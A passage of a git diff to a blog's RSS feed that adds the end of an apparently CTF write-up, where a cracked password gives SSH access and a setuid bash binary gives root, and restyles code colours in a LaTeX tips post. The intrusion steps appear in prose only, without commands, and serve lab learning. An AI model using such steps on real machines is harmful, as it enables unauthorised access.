+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h4&gt;&lt;p&gt;Using the cracked password we find, we&amp;rsquo;re able to ssh into the machine.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/ssh_topology.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;SSH-In&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h3 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
+&lt;span&gt;
+    &lt;a href=&#34;#privilege-escalation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;Root is pretty straight forward, there&amp;rsquo;s a setuid binary (bash)
+we could use to gain root privileges and read the root flag.
+&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_root.png&#34;/&gt;&lt;figcaption&gt;
+            &lt;h4&gt;Becoming Root&lt;/h4&gt;
+        &lt;/figcaption&gt;
+&lt;/figure&gt;
+&lt;/p&gt;</description>
+    </item>
     
     <item>
       <title>LaTeX Tricks (Org-Mode LaTeX Included)</title>
@@ -38,24 +265,24 @@
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# #+LaTeX_CLASS: org-plain-latex
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# #+LaTeX_CLASS: org-plain-latex
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+LaTeX_CLASS_OPTIONS: [letterpaper]
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#+LaTeX_CLASS_OPTIONS: [11pt,twoside=false]
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;% book
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: book
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;% book
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: book
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# #+LaTeX_CLASS_OPTIONS: [letterpaper]
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;% Koma Article
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: koma-article
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;% Koma Article
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: koma-article
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# #+LaTeX_CLASS_OPTIONS: [11pt,twoside=false,twocolumn]
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;% Koma book
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: koma-book
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;% Koma book
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: koma-book
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# #+LaTeX_CLASS_OPTIONS: [11pt,twoside=false,twocolumn]
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;% Memoir
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: memoir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;% Memoir
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;# #+LaTeX_CLASS: memoir
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# #+LaTeX_CLASS_OPTIONS: [11pt,oneside,onecolumn,openright,extrafontsizes]
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;table-of-contents-dot&#34; &gt;Table Of Contents.
 &lt;span&gt;
@@ -63,36 +290,36 @@
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\tableofcontents&lt;/span&gt; is how to include table of contents.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;We can customize our table of contents before we include it using &lt;span style=&#34;color:#66d9ef&#34;&gt;\usepackage&lt;/span&gt;{tocloft}.
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\tableofcontents&lt;/span&gt; is how to include table of contents.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;We can customize our table of contents before we include it using &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\usepackage&lt;/span&gt;{tocloft}.
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Then customize each level from chapter, section, subsection, subsubsection.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\tocloftpagestyle&lt;/span&gt;{fancy}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\cftsecafterpnum&lt;/span&gt;}{&lt;span style=&#34;color:#66d9ef&#34;&gt;\vskip&lt;/span&gt;2pt}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\cftsecfont&lt;/span&gt;}{&lt;span style=&#34;color:#66d9ef&#34;&gt;\sffamily\bfseries\itshape&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\tocloftpagestyle&lt;/span&gt;{fancy}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\cftsecafterpnum&lt;/span&gt;}{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\vskip&lt;/span&gt;2pt}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\cftsecfont&lt;/span&gt;}{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\sffamily\bfseries\itshape&lt;/span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...[snip]...
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or using the &lt;em&gt;tcolorbox&lt;/em&gt; library to create a custom table of contents box.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\begin&lt;/span&gt;{tcolorbox}[breakable,enhanced jigsaw,title={Table Of Contents},fonttitle=&lt;span style=&#34;color:#66d9ef&#34;&gt;\bfseries\Large&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  colback=yellow!10!white,colframe=red!50!black,before=&lt;span style=&#34;color:#66d9ef&#34;&gt;\par\bigskip\noindent&lt;/span&gt;,
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\begin&lt;/span&gt;{tcolorbox}[breakable,enhanced jigsaw,title={Table Of Contents},fonttitle=&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\bfseries\Large&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  colback=yellow!10!white,colframe=red!50!black,before=&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\par\bigskip\noindent&lt;/span&gt;,
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  interior style={fill overzoom image=goldshade.png,fill image opacity=0.25},
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  colbacktitle=red!50!yellow!75!black,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  enlargepage flexible=&lt;span style=&#34;color:#66d9ef&#34;&gt;\baselineskip&lt;/span&gt;,pad at break*=3mm,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  enlargepage flexible=&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\baselineskip&lt;/span&gt;,pad at break*=3mm,
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  height fixed for=first and middle,
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  watermark color=yellow!75!red!25!white,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  watermark text={&lt;span style=&#34;color:#66d9ef&#34;&gt;\bfseries\large&lt;/span&gt; I&amp;#39;m batman},
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  attach boxed title to top center={yshift=-0.25mm-&lt;span style=&#34;color:#66d9ef&#34;&gt;\tcboxedtitleheight&lt;/span&gt;/2,yshifttext=2mm-&lt;span style=&#34;color:#66d9ef&#34;&gt;\tcboxedtitleheight&lt;/span&gt;/2},
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  watermark text={&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\bfseries\large&lt;/span&gt; I&amp;#39;m batman},
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  attach boxed title to top center={yshift=-0.25mm-&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\tcboxedtitleheight&lt;/span&gt;/2,yshifttext=2mm-&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\tcboxedtitleheight&lt;/span&gt;/2},
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  boxed title style={enhanced,boxrule=0.5mm,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    frame code={ &lt;span style=&#34;color:#66d9ef&#34;&gt;\path&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[tcb fill frame]&lt;/span&gt; ([xshift=-4mm]frame.west) -- (frame.north west)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    frame code={ &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\path&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[tcb fill frame]&lt;/span&gt; ([xshift=-4mm]frame.west) -- (frame.north west)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -- (frame.north east) -- ([xshift=4mm]frame.east)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -- (frame.south east) -- (frame.south west) -- cycle; },
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    interior code={ &lt;span style=&#34;color:#66d9ef&#34;&gt;\path&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;[tcb fill interior]&lt;/span&gt; ([xshift=-2mm]interior.west)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    interior code={ &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\path&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[tcb fill interior]&lt;/span&gt; ([xshift=-2mm]interior.west)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -- (interior.north west) -- (interior.north east)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -- ([xshift=2mm]interior.east) -- (interior.south east) -- (interior.south west)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -- cycle;}  },
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  drop fuzzy shadow]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;\makeatletter&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;\@&lt;/span&gt;starttoc{toc} &lt;span style=&#34;color:#75715e&#34;&gt;% Replace it with \@starttoc{lot} for tables and \@starttoc{lof} for figures.
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;\makeatother&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\end&lt;/span&gt;{tcolorbox}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\makeatletter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\@&lt;/span&gt;starttoc{toc} &lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;% Replace it with \@starttoc{lot} for tables and \@starttoc{lof} for figures.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\makeatother&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\end&lt;/span&gt;{tcolorbox}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;text-tricks&#34; &gt;Text Tricks
 &lt;span&gt;
     &lt;a href=&#34;#text-tricks&#34;&gt;
@@ -129,21 +356,21 @@
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\setlength&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\parindent&lt;/span&gt;}{4mm} or using *em* or *pt*
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\setlength&lt;/span&gt;{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\parindent&lt;/span&gt;}{4mm} or using *em* or *pt*
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;paragraph-spacing&#34; &gt;Paragraph spacing
 &lt;span&gt;
     &lt;a href=&#34;#paragraph-spacing&#34;&gt;
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\setlength&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\parskip&lt;/span&gt;}{4mm} or using *em* or *pt*
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\setlength&lt;/span&gt;{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\parskip&lt;/span&gt;}{4mm} or using *em* or *pt*
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;line-spacing&#34; &gt;Line spacing
 &lt;span&gt;
     &lt;a href=&#34;#line-spacing&#34;&gt;
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;\baselinestretch&lt;/span&gt;}{1.5}
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\renewcommand&lt;/span&gt;{&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\baselinestretch&lt;/span&gt;}{1.5}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This value is somewhat confusing, because:&lt;/p&gt;
 &lt;table&gt;
 &lt;thead&gt;
@@ -183,11 +410,11 @@
     &lt;/a&gt;
 &lt;/span&gt;
 &lt;/h4&gt;&lt;p&gt;There are 3 ways to make a line break&lt;/p&gt;
